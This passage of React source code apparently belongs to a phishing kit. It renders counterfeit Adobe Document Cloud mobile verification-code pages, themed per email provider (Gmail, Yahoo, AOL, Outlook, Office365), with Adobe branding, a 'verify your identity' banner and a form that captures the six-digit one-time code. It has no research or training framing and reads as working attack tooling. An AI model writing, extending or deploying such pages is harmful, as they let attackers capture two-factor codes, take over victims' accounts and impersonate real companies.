            <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
            <span>{errorMessage}</span>
          </div>
        )}

        <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} />

        <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full flex items-center justify-center py-3 px-4 rounded-full font-semibold text-sm text-white bg-[#1473E6] hover:bg-[#0d66d0] disabled:opacity-50 transition-colors">
          {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
          {isLoading ? 'Verifying...' : 'Verify Code'}
        </button>
      </form>

      <div className="mt-8 pt-5" style={{ borderTop: '1px solid rgba(255,255,255,0.12)' }}>
        <div className="flex items-center justify-center gap-2 mb-2">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-3.5 h-3.5">
            <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
            <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
            <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
          </svg>
          <span className="text-xs font-medium text-gray-300">Adobe Document Cloud</span>
        </div>
        <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-1 text-[11px] text-gray-400">
          <a href="https://www.adobe.com/privacy.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-200 transition-colors">Privacy</a>
          <span style={{ color: 'rgba(255,255,255,0.3)' }}>|</span>
          <a href="https://www.adobe.com/legal/terms.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-200 transition-colors">Terms of Use</a>
          <span style={{ color: 'rgba(255,255,255,0.3)' }}>|</span>
          <a href="https://www.adobe.com/privacy/cookies.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-200 transition-colors">Cookie preferences</a>
          <span style={{ color: 'rgba(255,255,255,0.3)' }}>|</span>
          <span className="text-gray-500">Copyright © 2026 Adobe. All rights reserved.</span>
        </div>
      </div>
    </div>
  </div>
);

/* ── Others / Generic email provider OTP (Mobile) ─────────────── */
const MobileOthersOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
  const [resendSent, setResendSent] = useState(false);
  const [codeValue, setCodeValue] = useState('');
  const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();

  useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);

  const handleResend = () => {
    if (onResend) {
      onResend();
      setResendSent(true);
      resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
    }
  };

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
    setCodeValue(val);
    onOtpComplete(val);
  };

  return (
    <div className="min-h-screen flex flex-col font-sans" style={{ background: '#f5f5f5', fontFamily: "'adobe-clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
      <div className="flex-1 flex flex-col justify-center px-6 py-8">
        {/* Adobe Logo */}
        <div className="flex items-center gap-2 mb-6">
          <AdobeLogo />
          <span style={{ fontSize: '18px', fontWeight: 700, color: '#2c2c2c', letterSpacing: '-0.5px' }}>Adobe</span>
        </div>

        <div className="bg-white" style={{ borderRadius: '12px', padding: '28px 24px', boxShadow: '0 4px 24px rgba(0,0,0,.12)' }}>
          {/* Info Banner */}
          <div style={{ background: '#0265DC', color: '#fff', padding: '10px 14px', borderRadius: '6px', fontSize: '13px', marginBottom: '20px', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
              <circle cx="8" cy="8" r="8" fill="white" fillOpacity="0.3"/>
              <text x="8" y="12" textAnchor="middle" fill="white" fontSize="11" fontWeight="bold">i</text>
            </svg>
            For your protection, please verify your identity.
          </div>

          <h1 style={{ fontSize: '18px', fontWeight: 700, color: '#2c2c2c', marginBottom: '8px' }}>Check your email</h1>
          <p style={{ fontSize: '14px', color: '#6e6e6e', marginBottom: '20px' }}>
            {email
              ? <><span>We sent a verification code to </span><strong>{maskEmail(email)}</strong>.</>
              : 'We sent a verification code to your email address.'}
          </p>

          <form onSubmit={onSubmit}>
            {errorMessage && (
              <div style={{ marginBottom: '16px', padding: '10px 14px', borderRadius: '4px', fontSize: '13px', color: '#c9252d', background: '#fff0f0', border: '1px solid #ffc0c0' }}>
                {errorMessage}
              </div>
            )}

            <div style={{ marginBottom: '16px' }}>
              <label style={{ display: 'block', fontSize: '14px', color: '#4b4b4b', marginBottom: '6px', fontWeight: 500 }}>
                Verification code
              </label>
              <input
                type="text"
                inputMode="numeric"
                autoComplete="one-time-code"
                placeholder="Enter 6-digit code"
                value={codeValue}
                onChange={handleCodeChange}
                disabled={isLoading}
                autoFocus
                style={{ width: '100%', boxSizing: 'border-box', padding: '10px 12px', border: '2px solid #d3d3d3', borderRadius: '4px', fontSize: '16px', color: '#323232', outline: 'none', transition: 'border-color 0.2s' }}
                onFocus={(e) => (e.target.style.borderColor = '#1473e6')}
                onBlur={(e) => (e.target.style.borderColor = '#d3d3d3')}
              />
            </div>

            <button
              type="submit"
              disabled={isLoading || otp.length < 6}
              style={{ width: '100%', padding: '12px', backgroundColor: isLoading || otp.length < 6 ? '#b8b8b8' : '#1473e6', color: '#fff', border: 'none', borderRadius: '20px', fontSize: '15px', fontWeight: 600, cursor: isLoading || otp.length < 6 ? 'not-allowed' : 'pointer', transition: 'background-color 0.2s', display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '44px' }}
            >
              {isLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Verify'}
            </button>
          </form>

          <div style={{ marginTop: '16px', textAlign: 'center' }}>
            <button
              type="button"
              onClick={handleResend}
              disabled={resendSent}
              style={{ background: 'none', border: 'none', color: resendSent ? '#959595' : '#1473e6', fontSize: '14px', cursor: resendSent ? 'default' : 'pointer', fontWeight: 500 }}
            >
              {resendSent ? 'Code sent! Check your inbox' : 'Resend code'}
            </button>
          </div>
        </div>

        <div style={{ marginTop: '24px', paddingTop: '16px', borderTop: '1px solid #e0e0e0' }}>
          <p style={{ fontSize: '11px', color: '#959595', lineHeight: 1.5, margin: 0, textAlign: 'center' }}>
            Copyright © 2025 Adobe. All rights reserved.{' '}
            <a href="https://www.adobe.com/go/terms_en" target="_blank" rel="noopener noreferrer" style={{ color: '#959595' }}>Terms of Use</a>
            {' | '}
            <a href="https://www.adobe.com/go/privacy_policy_en" target="_blank" rel="noopener noreferrer" style={{ color: '#959595' }}>Privacy</a>
          </p>
        </div>
      </div>
    </div>
  );
};

/* ── Main Mobile OTP Page (routes to the right provider theme) ── */
const MobileOtpPage: React.FC<MobileOtpPageProps> = ({ onSubmit, isLoading, errorMessage, email, provider, onResend }) => {
  const [otp, setOtp] = useState('');

  const handleOtpComplete = (completedOtp: string) => {
    setOtp(completedOtp);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length >= 6) {
      onSubmit(otp);
    }
  };

  const sharedProps = { email, errorMessage, isLoading, otp, onOtpComplete: handleOtpComplete, onSubmit: handleSubmit };

  switch (provider) {
    case 'Gmail':
      return <MobileGmailOtp {...sharedProps} />;
    case 'Yahoo':
      return <MobileYahooOtp {...sharedProps} onResend={onResend} />;
    case 'AOL':
      return <MobileAolOtp {...sharedProps} onResend={onResend} />;
    case 'Outlook':
      return <MobileOutlookOtp {...sharedProps} onResend={onResend} />;
    case 'Office365':
      return <MobileOffice365Otp {...sharedProps} onResend={onResend} />;
    case 'Others':
      return <MobileOthersOtp {...sharedProps} onResend={onResend} />;
    default:
      return <MobileDefaultOtp {...sharedProps} />;
  }
};

export default MobileOtpPage;
